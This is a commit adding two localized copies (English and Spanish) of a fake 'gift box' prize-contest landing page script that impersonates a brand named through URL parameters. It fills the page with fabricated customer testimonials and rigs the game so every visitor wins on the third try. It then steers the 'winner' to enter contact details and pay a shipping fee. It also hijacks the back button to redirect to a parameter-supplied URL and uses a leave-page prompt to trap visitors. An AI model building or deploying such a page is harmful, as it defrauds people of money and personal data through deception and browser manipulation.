ea37dd42c61fe2c9a41b6472e081d146e2b8386b
WeiStyle-key <1182909744@qq.com>
2023-06-10 23:43:28 +0800

    up

---
+++ AU/giftbox/javascript.js
@@ -0,0 +1,339 @@
+// <span class='date_day_week'></span>
+// var array_day = new Array("vasárnap", "hétfő", "Kedd", "szerda", "csütörtök", "péntek", "szombat"); // HU
+// var array_day = new Array("Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"); // FR
+// var array_day = new Array("søndag", "mandag", "tirsdag", "onsdag", "torsdag", "fredag", "lørdag"); // DK
+// var array_day = new Array("söndag", "måndag", "tisdag", "onsdag", "torsdag", "fredag", "lördag"); // SE
+// var array_day = new Array("domenica", "lunedi", "martedi", "mercoledi", "giovedi", "venerdi", "sabato"); // IT
+//var array_day = new Array( "domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado" ); // ES
+var array_day = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"); // ES
+
+
+ // <span class='date_day_number'></span>
+ // <span class='date_month'></span>
+// var array_month = new Array("január", "február", "március", "április", "Lehet", "június", "július", "augusztus", "szeptember", "október", "november", "december"); // HU
+// var array_month = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"); // FR
+// var array_month = new Array("januar", "februar", "marts", "april", "maj", "juni", "juli", "august", "september", "oktober", "november", "december"); // DK
+// var array_month = new Array("Januari", "Februari", "Mars", "April", "Maj", "Juni", "Juli", "Augusti", "September", "Oktober", "November", "December"); // SE
+//var array_month = new Array("gennaio", "febbraio", "marzo", "aprile", "maggio", "giugno", "luglio", "agosto", "settembre", "ottobre", "novembre", "dicembre"); // IT
+//var array_month = new Array("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"); // ES
+var array_month = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
+
+// <span class='date_year'></span>
+
+var win_box = 'winbox.png'; // Prize in box
+var title = 'Congratulations'; // Title
+var o = '#FFA400'; // favicon color
+var a = ""; // logo relative path
+var a2 = ""; // header right icon relative path
+var b = "<span class='spo'></span> Promotional Contest, today only - <span class='date_day_number'></span> <span class='date_month'></span> <span class='date_year'></span>"; // subtitle
+var d = "Dear <span class='spo'></span> customer,"; // dear user
+var e = "Every <span class='date_day_week'></span>, we give seven lucky visitors the chance to win a new <span class='w_b'></span> product."; // explanation
+var g = "All you need to do is pick the right box!"; // directions box 1
+var h = "Try to find the <span class='w_b'></span> <span class='w'></span>"; // directions box 2
+
+var j = "Like"; // Like
+var k = 4281; // page likes
+var w = " "; // thousand separator for numbers
+var l = 'Reply'; // Reply
+
+// var m_1_i = 'g.gif'; // Modal 1 image
+var m_1_i = 'a.png'; // Modal 1 image
+var m_1_t = "<span class='spo'></span> Promotional Contest"; // Modal 1 title
+var m_1_d = [{ // Modal 1 description
+	"1": "Congratulations <span class='spo'></span> customer!",
+	"2": "We want to thank you for your loyalty to <span class='spo'></span>, and offer you the chance to win the new <strong><span class='w_b'></span> <span class='w'></span></strong> today!",
+	"3": "All you have to do is choose the correct gift box.",
+	"4": "<strong>You have 3 attempts, good luck!</strong>",
+}];
+var m_1_b = 'OK'; // Modal 1 button
+
+var m_2_i = 's.png'; // Modal 2 image
+var m_2_d_2 = '(2) more attempts';
+var m_2_d_1 = '(1) more attempt';
+var m_2_d = 'Sorry, this gift box is empty! You still have <span id="try"></span>. Good luck!'; // Modal 2 description
+var m_2_b = 'OK'; // Modal 2 button
+
+var m_3_i = 'prize.png'; // Modal 3 image
+var m_3_t = 'Congratulations!'; // Modal 3 title
+var m_3_s = '(1) <span class="w_b"></span> <span class="w"></span> is reserved for you!'; // Modal 3 title
+var m_3_d = [{ // Modal 3 description
+	"1": "1. Confirm your contact information and delivery address on the next page.",
+	"2": "2. Pay the shipping and handling fee.",
+	"3": "3. Your <span class='w_b'></span> <span class='w'></span> will be delivered to the specified address in 3-5 business days.",
+}];
+var m_3_b = 'OK'; // Modal 3 button
+
+
+var i = [{
+	"1": {
+		"name": "Ella Slobodian",
+		"likes": "",
+		"time": "4 minutes ago",
+		"comment": {
+			"1": "All the gifts are empty!",
+		}
+	},
+	"2": {
+		"name": "Robert Carlyle",
+		"likes": "12",
+		"time": "5 minutes ago",
+		"comment": {
+			"1": "I got it on my second try! Oh yeah!!!",
+		}
+	},
+	"3": {
+		"name": "Valerie Clumy",
+		"likes": "3",
+		"time": "11 minutes ago",
+		"comment": {
+			"1": "Thank you very much <span class='spo'></span>! I received my reward today by DHL!",
+		}
+	},
+	"4": {
+		"name": "Chris Chicks",
+		"likes": "33",
+		"time": "15 minutes ago",
+		"comment": {
+			"1": "Am I the only person who lost? :(",
+		}
+	},
+	"5": {
+		"name": "Andy Porchetta",
+		"likes": "42",
+		"time": "1 hour ago",
+		"comment": {
+			"1": "They are incredible! Thank you so much for doing this!",
+		}
+	},
+	"6": {
+		"name": "Charlotte Parkin",
+		"likes": "419",
+		"time": "1 hour ago",
+		"comment": {
+			"1": "I thought it was a joke, but my <span class='w'></span> came this morning. However, you must carefully follow the instructions.",
+		}
+	},
+	"7": {
+		"name": "Kevin Mundie",
+		"likes": "",
+		"time": "2 hours ago",
+		"comment": {
+			"1": "Thank you all!",
+		}
+	},
+}];
+
+function getUrlParam2(parameter, defaultvalue){
+    var urlparameter = defaultvalue;
+    if(window.location.href.indexOf(parameter) > -1){
+        urlparameter = getUrlVars()[parameter];
+        }
+    return urlparameter;
+}
+
+function getUrlParam(param, defaultValue) {
+	const url = new URL(window.location.href),
+		urlParams = new window.URLSearchParams(url.search),
+		value = urlParams.get(param);
+	return value ? value : defaultValue;
+}
+
+// ON PAGE LOAD
+$(document).ready(function(){
+	win_brand = getUrlParam('bra', 'Brand');
+	win = getUrlParam('pro', 'Product');
+	spo = getUrlParam('spo', '{device_brand}');
+
+	$(document).prop('title', title);
+	if ( a != '' ) { $('#a .a').append('<img class="left" src="' + a + '" />'); }
+	if ( a2 != '' ) { $('#a .a').append('<img class="right" src="' + a2 + '" />'); }
+	$('#a .a').append('<div class="z"></div>');
+	if ( b != '' ) { $('#b').html('<div class="a">' + b + '</div>'); } else { $('#b').remove(); }
+	if ( d != '' ) { $('#d').html(d); } else { $('#d').remove(); }
+	if ( e != '' ) { $('#e').html(e); } else { $('#e').remove(); }
+	if ( g != '' ) { $('#g').html(g); } else { $('#g').remove(); }
+	if ( h != '' ) { $('#h').html(h); } else { $('#h').remove(); }
+	if ( k != '' ) { $('#l').html(y(k,w)); } else { $('#l').html(y(1945,w)); }
+	if ( i != '' ) {
+		var m = '';
+		var foo = 0;
+		var bar = 0;
+		$.each(i, function(idx, obj) {
+			$.each(obj, function(idx, obj2) {
+				foo++;
+				if ( ( foo - 1 ) % 4 == 0 && foo != 1 ) { bar++; foo = foo - ((( foo - 1 ) / 4 ) * 4 ); } var f_t = 0; var f_l = 0; f_t = ( foo - 1 ) * 48; f_l = bar * 48;
+				n = ''; oc = '';
+				if ( obj2.comment ) { $.each(obj2.comment, function(idx, com) { oc = oc + "<p>" + com + "</p>"; }); }
+				if ( obj2.likes > 0 ) { n = y(obj2.likes,w) + ' <span class="m"></span>'; } else { n = '<span class="m"></span>'; }
+				m = m + '<div class="j"><div class="n" style="background:url(\'pics.jpg\') no-repeat;background-position:-' + f_t + 'px -' + f_l + 'px;"></div><div class="o"><div class="p">' + obj2.name + '</div><div class="q">' + oc + '</div><div class="r">' + l + ' · <span class="k"></span> ' + n + ' · <span class="s">' + obj2.time + '</span></div></div><div class="z"></div></div>';
+			});
+		});
+		$('#k').html(m);
+	} else { $('#k').remove(); }
+	if ( j != '' ) { $('.m').each(function(i, obj) { $(this).html(j); }); }
+	// modal 1
+	if ( m_1_i != '' ) { $('#m_1_i').html('<img src="' + m_1_i + '" />'); } else { $('#m_1_i').remove(); }
+	if ( m_1_t != '' ) { $('#m_1_t').html(m_1_t); } else { $('#m_1_t').remove(); }
+	if ( m_1_d != '' ) {
+		var m = '';
+		// var foo = 0;
+		$.each(m_1_d, function(idx, obj) { $.each(obj, function(idx, obj2) { m = m + '<p>' + obj2 + '</p>'; }); });
+		$('#m_1_d').html(m);
+	} else { $('#m_1_d').remove(); }
+	if ( m_1_b != '' ) { $('#m_1_b a').text(m_1_b); } else { $('#m_1_b').text('OK'); }
+	// modal 2
+	if ( m_2_i != '' ) { $('#m_2_i').html('<img src="' + m_2_i + '" />'); } else { $('#m_2_i').remove(); }
+	if ( m_2_d != '' ) { $('#m_2_d').html('<p>' + m_2_d + '</p>'); } else { $('#m_2_d').remove(); }
+	if ( m_2_b != '' ) { $('#m_2_b a').text(m_2_b); } else { $('#m_2_b a').text('OK'); }
+	// modal 3
+	if ( m_3_t != '' ) { $('#m_3_t').html(m_3_t); } else { $('#m_3_t').remove(); }
+	if ( m_3_s != '' ) { $('#m_3_s').html(m_3_s); } else { $('#m_3_s').remove(); }
+	if ( m_3_i != '' ) { $('#m_3_i').html('<img src="' + m_3_i + '" />'); } else { $('#m_3_i').remove(); }
+	if ( m_3_d != '' ) {
+		var m = '';
+		$.each(m_3_d, function(idx, obj) { $.each(obj, function(idx, obj2) { m = m + '<p>' + obj2 + '</p>'; }); });
+		$('#m_3_d').html(m);
+	} else { $('#m_3_d').remove(); }
+	if ( m_3_b != '' ) { $('#m_3_b a').text(m_3_b); } else { $('#m_3_b a').text('OK'); }
+	
+	if ( win != '' ) { $('.w').each(function(i, obj) { $(this).html(win); }); }
+	if ( win_brand != '' ) { $('.w_b').each(function(i, obj) { $(this).html(win_brand); }); }
+	if ( spo != '' ) { $('.spo').each(function(i, obj) { $(this).html(spo); }); }
+	
+	// load boxes
+	for (i = 0; i < 12; i++) {
+		$('#i').append('<div class="e" id="b_' + i + '"><div class="f"><div class="g"><a href="#" onclick="cl(\'b_' + i + '\');return false;"><img src="a.png" /></a></div></div></div>');
+	}
+	$('#i').append('<div class="z"></div>');
+	
+	//load modal 1
+	$('#m').fadeIn( "slow", function() {
+		$('#m_1').fadeIn( "200", function() {});
+		$('#m_1 .t_a').removeClass('small');
+	});
+	
+	// dates
+	var mydate = new Date();
+	mydate.setDate(mydate.getDate()-0);
+	
+	var year=mydate.getYear();
+	if (year < 1000) { year += 1900; }
+	
+	var day = mydate.getDay();
+	var month = mydate.getMonth();
+	
+	var daym = mydate.getDate();
+	if ( daym < 10 ) { daym = "0" + daym; }
+	
+	$('.date_day_number').each(function(i, obj) { $(this).html( daym ); });
+	$('.date_month').each(function(i, obj) { $(this).html( array_month[month] ); });
+	$('.date_day_week').each(function(i, obj) { $(this).html( array_day[day] ); });
+	$('.date_year').each(function(i, obj) { $(this).html( year ); });
+	
+});
+// ON PAGE LOAD
+
+// ON CLICK
+function cl(x) {
+	if ( try_num > 2 ) {
+		$('#try').html(m_2_d_2);
+	} else {
+		$('#try').html(m_2_d_1);
+	}
+	if ( try_num > 1 ) {
+		try_num = try_num - 1;
+		$('#' + x).html('<div class="f"><div class="h"><div></div></div></div>');
+		$('#m').fadeIn( "slow", function() {
+			$('#m_2').fadeIn( "200", function() {});
+			$('#m_2 .t_a').removeClass('small');
+		});
+	} else {
+		// win
+		$('#' + x).html('<div class="f"><div class="i"><div></div><div></div><div></div></div></div>');
+		if ( win_box != '' ) { $('#' + x + ' .i div:nth-child(1)').css("background","url('"+win_box+"')"); }
+		if ( win_box != '' ) { $('#' + x + ' .i div:nth-child(1)').css("background-size","contain"); }
+		$('#m').fadeIn( "slow", function() {
+			$('#m_3').fadeIn( "200", function() {});
+			$('#m_3 .t_a').removeClass('small');
+		});
+	}
+}
+// ON CLICK
+
+// FAVICON
+window.onload = function() {
+	z(1);
+};
+// FAVICON
+
+// COMMA
+function y(x,y) {
+    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, y);
+}
+// COMMA
+
+// FAVICON
+function z(y) {
+	if ( !y ) { y = 1; }
+	var z1 = document.createElement('canvas');
+	z1.width = 16;
+	z1.height = 16;
+	var x = z1.getContext('2d');
+	x.beginPath();
+	x.rect(0, 2, 14, 14);
+	x.fillStyle = o;
+	x.fill();
+	x.beginPath();
+	x.arc( 16 - 6 , 6, 6, 0, 2*Math.PI);
+	x.fillStyle = '#ff0000';
+	x.fill();
+	x.strokeStyle = '#ffffff';
+	x.stroke();
+	x.font = 'bold 10px "arial", sans-serif';
+	<!-- x.font-weight = "bold"; -->
+	x.textAlign = "center";
+	x.textBaseline = "middle";
+	x.fillStyle = '#ffffff';
+	x.fillText(y, 10, 6);
+	favicon.href = z1.toDataURL('image/png');
+}
+// FAVICON
+
+// GO
+function go() {
+	window.onbeforeunload = null;
+}
+	
+// BACK
+var bbid = getParam('bb');
+if (bbid) {
+var bburl = "//"+getParam('td')+"/"+bbid+"?cid="+getParam('cid');
+! function() {
+	  var t;
+	  try {
+		  for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+		  onpopstate = function(t) {
+			window.onbeforeunload=null;
+			t.state && location.replace(bburl);
+		  }
+	  } catch (o) {}
+  }();
+}
+
+// GET PARAMETER
+function getParam(name) {
+	return decodeURI(
+		(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+	);
+}
+
+// UNLOAD
+var pz = 1;
+window.onunload = window.onbeforeunload = function(evt) {
+	var message = "Back to the store?";
+	if (pz == 1) {
+		if (typeof evt == "undefined") evt = window.event;
+		if (evt) evt.returnValue = message;
+		return message;
+	}
+};
---
+++ CO/giftbox/javascript.js
@@ -0,0 +1,337 @@
+// <span class='date_day_week'></span>
+// var array_day = new Array("vasárnap", "hétfő", "Kedd", "szerda", "csütörtök", "péntek", "szombat"); // HU
+// var array_day = new Array("Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"); // FR
+// var array_day = new Array("søndag", "mandag", "tirsdag", "onsdag", "torsdag", "fredag", "lørdag"); // DK
+// var array_day = new Array("söndag", "måndag", "tisdag", "onsdag", "torsdag", "fredag", "lördag"); // SE
+// var array_day = new Array("domenica", "lunedi", "martedi", "mercoledi", "giovedi", "venerdi", "sabato"); // IT
+//var array_day = new Array( "domingo", "lunes", "martes", "miércoles", "jueves", "viernes", "sábado" ); // ES
+var array_day = new Array("Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado");// ES
+
+
+ // <span class='date_day_number'></span>
+ // <span class='date_month'></span>
+// var array_month = new Array("január", "február", "március", "április", "Lehet", "június", "július", "augusztus", "szeptember", "október", "november", "december"); // HU
+// var array_month = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "Novembre", "Décembre"); // FR
+// var array_month = new Array("januar", "februar", "marts", "april", "maj", "juni", "juli", "august", "september", "oktober", "november", "december"); // DK
+// var array_month = new Array("Januari", "Februari", "Mars", "April", "Maj", "Juni", "Juli", "Augusti", "September", "Oktober", "November", "December"); // SE
+//var array_month = new Array("gennaio", "febbraio", "marzo", "aprile", "maggio", "giugno", "luglio", "agosto", "settembre", "ottobre", "novembre", "dicembre"); // IT
+//var array_month = new Array("enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"); // ES
+var array_month = new Array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");
+
+// <span class='date_year'></span>
+
+var win_box = 'winbox.png'; // Premio en la caja
+var title = 'Felicidades'; // Título
+var o = '#FFA400'; // color del favicon
+var a = ""; // ruta relativa del logotipo
+var a2 = ""; // ruta relativa del icono del encabezado derecho
+var b = "<span class='spo'></span> Concurso Promocional, solo hoy - <span class='date_day_number'></span> <span class='date_month'></span> <span class='date_year'></span>"; // subtítulo
+var d = "Estimado(a) cliente <span class='spo'></span>,"; // estimado usuario
+var e = "Cada <span class='date_day_week'></span>, ofrecemos a siete visitantes afortunados la oportunidad de ganar un nuevo producto <span class='w_b'></span>."; // explicación
+var g = "¡Todo lo que necesitas hacer es elegir la caja correcta!"; // instrucciones caja 1
+var h = "Intenta encontrar la <span class='w_b'></span> <span class='w'></span>"; // instrucciones caja 2
+
+var j = "Me gusta"; // Me gusta
+var k = 4281; // Me gusta en la página
+var w = " "; // separador de miles para números
+var l = 'Responder'; // Responder
+
+var m_1_i = 'a.png'; // Imagen del Modal 1
+var m_1_t = "<span class='spo'></span> Concurso Promocional"; // Título del Modal 1
+var m_1_d = [{ // Descripción del Modal 1
+"1": "¡Felicidades, estimado(a) cliente <span class='spo'></span>!",
+"2": "Queremos agradecerte por tu lealtad a <span class='spo'></span>, y ofrecerte la oportunidad de ganar el nuevo <strong><span class='w_b'></span> <span class='w'></span></strong> hoy.",
+"3": "Todo lo que tienes que hacer es elegir la caja de regalo correcta.",
+"4": "<strong>Tienes 3 intentos, ¡buena suerte!</strong>",
+}];
+var m_1_b = 'OK'; // Botón del Modal 1
+
+var m_2_i = 's.png'; // Imagen del Modal 2
+var m_2_d_2 = '(2) intentos más';
+var m_2_d_1 = '(1) intento más';
+var m_2_d = '¡Lo siento, esta caja de regalo está vacía! Aún te quedan <span id="try"></span>. ¡Buena suerte!'; // Descripción del Modal 2
+var m_2_b = 'OK'; // Botón del Modal 2
+
+var m_3_i = 'prize.png'; // Imagen del Modal 3
+var m_3_t = '¡Felicidades!'; // Título del Modal 3
+var m_3_s = '(1) <span class="w_b"></span> <span class="w"></span> está reservado(a) para ti.'; // Título del Modal 3
+var m_3_d = [{ // Descripción del Modal 3
+"1": "1. Confirma tu información de contacto y dirección de entrega en la siguiente página.",
+"2": "2. Paga la tarifa de envío y manipulación.",
+"3": "3. Tu <span class='w_b'></span> <span class='w'></span> será entregado(a) a la dirección especificada en un plazo de 3 a 5 días hábiles.",
+}];
+var m_3_b = 'OK'; // Botón del Modal 3
+
+var i = [{
+	"1": {
+	"name": "Ella Slobodian",
+	"likes": "",
+	"time": "Hace 4 minutos",
+	"comment": {
+	"1": "¡Todos los regalos están vacíos!",
+	}
+	},
+	"2": {
+	"name": "Robert Carlyle",
+	"likes": "12",
+	"time": "Hace 5 minutos",
+	"comment": {
+	"1": "¡Lo conseguí en mi segundo intento! ¡Oh yeah!",
+	}
+	},
+	"3": {
+	"name": "Valerie Clumy",
+	"likes": "3",
+	"time": "Hace 11 minutos",
+	"comment": {
+	"1": "¡Muchas gracias, <span class='spo'></span>! ¡Recibí mi recompensa hoy por DHL!",
+	}
+	},
+	"4": {
+	"name": "Chris Chicks",
+	"likes": "33",
+	"time": "Hace 15 minutos",
+	"comment": {
+	"1": "¿Soy la única persona que perdió? :(",
+	}
+	},
+	"5": {
+	"name": "Andy Porchetta",
+	"likes": "42",
+	"time": "Hace 1 hora",
+	"comment": {
+	"1": "¡Son increíbles! ¡Muchas gracias por hacer esto!",
+	}
+	},
+	"6": {
+	"name": "Charlotte Parkin",
+	"likes": "419",
+	"time": "Hace 1 hora",
+	"comment": {
+	"1": "Pensé que era una broma, pero mi <span class='w'></span> llegó esta mañana. Sin embargo, debes seguir las instrucciones cuidadosamente.",
+	}
+	},
+	"7": {
+	"name": "Kevin Mundie",
+	"likes": "",
+	"time": "Hace 2 horas",
+	"comment": {
+	"1": "¡Muchas gracias a todos!",
+	}
+	},
+	}];
+
+function getUrlParam2(parameter, defaultvalue){
+    var urlparameter = defaultvalue;
+    if(window.location.href.indexOf(parameter) > -1){
+        urlparameter = getUrlVars()[parameter];
+        }
+    return urlparameter;
+}
+
+function getUrlParam(param, defaultValue) {
+	const url = new URL(window.location.href),
+		urlParams = new window.URLSearchParams(url.search),
+		value = urlParams.get(param);
+	return value ? value : defaultValue;
+}
+
+// ON PAGE LOAD
+$(document).ready(function(){
+	win_brand = getUrlParam('bra', 'Brand');
+	win = getUrlParam('pro', 'Product');
+	spo = getUrlParam('spo', '{device_brand}');
+
+	$(document).prop('title', title);
+	if ( a != '' ) { $('#a .a').append('<img class="left" src="' + a + '" />'); }
+	if ( a2 != '' ) { $('#a .a').append('<img class="right" src="' + a2 + '" />'); }
+	$('#a .a').append('<div class="z"></div>');
+	if ( b != '' ) { $('#b').html('<div class="a">' + b + '</div>'); } else { $('#b').remove(); }
+	if ( d != '' ) { $('#d').html(d); } else { $('#d').remove(); }
+	if ( e != '' ) { $('#e').html(e); } else { $('#e').remove(); }
+	if ( g != '' ) { $('#g').html(g); } else { $('#g').remove(); }
+	if ( h != '' ) { $('#h').html(h); } else { $('#h').remove(); }
+	if ( k != '' ) { $('#l').html(y(k,w)); } else { $('#l').html(y(1945,w)); }
+	if ( i != '' ) {
+		var m = '';
+		var foo = 0;
+		var bar = 0;
+		$.each(i, function(idx, obj) {
+			$.each(obj, function(idx, obj2) {
+				foo++;
+				if ( ( foo - 1 ) % 4 == 0 && foo != 1 ) { bar++; foo = foo - ((( foo - 1 ) / 4 ) * 4 ); } var f_t = 0; var f_l = 0; f_t = ( foo - 1 ) * 48; f_l = bar * 48;
+				n = ''; oc = '';
+				if ( obj2.comment ) { $.each(obj2.comment, function(idx, com) { oc = oc + "<p>" + com + "</p>"; }); }
+				if ( obj2.likes > 0 ) { n = y(obj2.likes,w) + ' <span class="m"></span>'; } else { n = '<span class="m"></span>'; }
+				m = m + '<div class="j"><div class="n" style="background:url(\'pics.jpg\') no-repeat;background-position:-' + f_t + 'px -' + f_l + 'px;"></div><div class="o"><div class="p">' + obj2.name + '</div><div class="q">' + oc + '</div><div class="r">' + l + ' · <span class="k"></span> ' + n + ' · <span class="s">' + obj2.time + '</span></div></div><div class="z"></div></div>';
+			});
+		});
+		$('#k').html(m);
+	} else { $('#k').remove(); }
+	if ( j != '' ) { $('.m').each(function(i, obj) { $(this).html(j); }); }
+	// modal 1
+	if ( m_1_i != '' ) { $('#m_1_i').html('<img src="' + m_1_i + '" />'); } else { $('#m_1_i').remove(); }
+	if ( m_1_t != '' ) { $('#m_1_t').html(m_1_t); } else { $('#m_1_t').remove(); }
+	if ( m_1_d != '' ) {
+		var m = '';
+		// var foo = 0;
+		$.each(m_1_d, function(idx, obj) { $.each(obj, function(idx, obj2) { m = m + '<p>' + obj2 + '</p>'; }); });
+		$('#m_1_d').html(m);
+	} else { $('#m_1_d').remove(); }
+	if ( m_1_b != '' ) { $('#m_1_b a').text(m_1_b); } else { $('#m_1_b').text('OK'); }
+	// modal 2
+	if ( m_2_i != '' ) { $('#m_2_i').html('<img src="' + m_2_i + '" />'); } else { $('#m_2_i').remove(); }
+	if ( m_2_d != '' ) { $('#m_2_d').html('<p>' + m_2_d + '</p>'); } else { $('#m_2_d').remove(); }
+	if ( m_2_b != '' ) { $('#m_2_b a').text(m_2_b); } else { $('#m_2_b a').text('OK'); }
+	// modal 3
+	if ( m_3_t != '' ) { $('#m_3_t').html(m_3_t); } else { $('#m_3_t').remove(); }
+	if ( m_3_s != '' ) { $('#m_3_s').html(m_3_s); } else { $('#m_3_s').remove(); }
+	if ( m_3_i != '' ) { $('#m_3_i').html('<img src="' + m_3_i + '" />'); } else { $('#m_3_i').remove(); }
+	if ( m_3_d != '' ) {
+		var m = '';
+		$.each(m_3_d, function(idx, obj) { $.each(obj, function(idx, obj2) { m = m + '<p>' + obj2 + '</p>'; }); });
+		$('#m_3_d').html(m);
+	} else { $('#m_3_d').remove(); }
+	if ( m_3_b != '' ) { $('#m_3_b a').text(m_3_b); } else { $('#m_3_b a').text('OK'); }
+	
+	if ( win != '' ) { $('.w').each(function(i, obj) { $(this).html(win); }); }
+	if ( win_brand != '' ) { $('.w_b').each(function(i, obj) { $(this).html(win_brand); }); }
+	if ( spo != '' ) { $('.spo').each(function(i, obj) { $(this).html(spo); }); }
+	
+	// load boxes
+	for (i = 0; i < 12; i++) {
+		$('#i').append('<div class="e" id="b_' + i + '"><div class="f"><div class="g"><a href="#" onclick="cl(\'b_' + i + '\');return false;"><img src="a.png" /></a></div></div></div>');
+	}
+	$('#i').append('<div class="z"></div>');
+	
+	//load modal 1
+	$('#m').fadeIn( "slow", function() {
+		$('#m_1').fadeIn( "200", function() {});
+		$('#m_1 .t_a').removeClass('small');
+	});
+	
+	// dates
+	var mydate = new Date();
+	mydate.setDate(mydate.getDate()-0);
+	
+	var year=mydate.getYear();
+	if (year < 1000) { year += 1900; }
+	
+	var day = mydate.getDay();
+	var month = mydate.getMonth();
+	
+	var daym = mydate.getDate();
+	if ( daym < 10 ) { daym = "0" + daym; }
+	
+	$('.date_day_number').each(function(i, obj) { $(this).html( daym ); });
+	$('.date_month').each(function(i, obj) { $(this).html( array_month[month] ); });
+	$('.date_day_week').each(function(i, obj) { $(this).html( array_day[day] ); });
+	$('.date_year').each(function(i, obj) { $(this).html( year ); });
+	
+});
+// ON PAGE LOAD
+
+// ON CLICK
+function cl(x) {
+	if ( try_num > 2 ) {
+		$('#try').html(m_2_d_2);
+	} else {
+		$('#try').html(m_2_d_1);
+	}
+	if ( try_num > 1 ) {
+		try_num = try_num - 1;
+		$('#' + x).html('<div class="f"><div class="h"><div></div></div></div>');
+		$('#m').fadeIn( "slow", function() {
+			$('#m_2').fadeIn( "200", function() {});
+			$('#m_2 .t_a').removeClass('small');
+		});
+	} else {
+		// win
+		$('#' + x).html('<div class="f"><div class="i"><div></div><div></div><div></div></div></div>');
+		if ( win_box != '' ) { $('#' + x + ' .i div:nth-child(1)').css("background","url('"+win_box+"')"); }
+		if ( win_box != '' ) { $('#' + x + ' .i div:nth-child(1)').css("background-size","contain"); }
+		$('#m').fadeIn( "slow", function() {
+			$('#m_3').fadeIn( "200", function() {});
+			$('#m_3 .t_a').removeClass('small');
+		});
+	}
+}
+// ON CLICK
+
+// FAVICON
+window.onload = function() {
+	z(1);
+};
+// FAVICON
+
+// COMMA
+function y(x,y) {
+    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, y);
+}
+// COMMA
+
+// FAVICON
+function z(y) {
+	if ( !y ) { y = 1; }
+	var z1 = document.createElement('canvas');
+	z1.width = 16;
+	z1.height = 16;
+	var x = z1.getContext('2d');
+	x.beginPath();
+	x.rect(0, 2, 14, 14);
+	x.fillStyle = o;
+	x.fill();
+	x.beginPath();
+	x.arc( 16 - 6 , 6, 6, 0, 2*Math.PI);
+	x.fillStyle = '#ff0000';
+	x.fill();
+	x.strokeStyle = '#ffffff';
+	x.stroke();
+	x.font = 'bold 10px "arial", sans-serif';
+	<!-- x.font-weight = "bold"; -->
+	x.textAlign = "center";
+	x.textBaseline = "middle";
+	x.fillStyle = '#ffffff';
+	x.fillText(y, 10, 6);
+	favicon.href = z1.toDataURL('image/png');
+}
+// FAVICON
+
+// GO
+function go() {
+	window.onbeforeunload = null;
+}
+	
+// BACK
+var bbid = getParam('bb');
+if (bbid) {
+var bburl = "//"+getParam('td')+"/"+bbid+"?cid="+getParam('cid');
+! function() {
+	  var t;
+	  try {
+		  for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+		  onpopstate = function(t) {
+			window.onbeforeunload=null;
+			t.state && location.replace(bburl);
+		  }
+	  } catch (o) {}
+  }();
+}
+
+// GET PARAMETER
+function getParam(name) {
+	return decodeURI(
+		(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+	);
+}
+
+// UNLOAD
+var pz = 1;
+window.onunload = window.onbeforeunload = function(evt) {
+	var message = "Back to the store?";
+	if (pz == 1) {
+		if (typeof evt == "undefined") evt = window.event;
+		if (evt) evt.returnValue = message;
+		return message;
+	}
+};
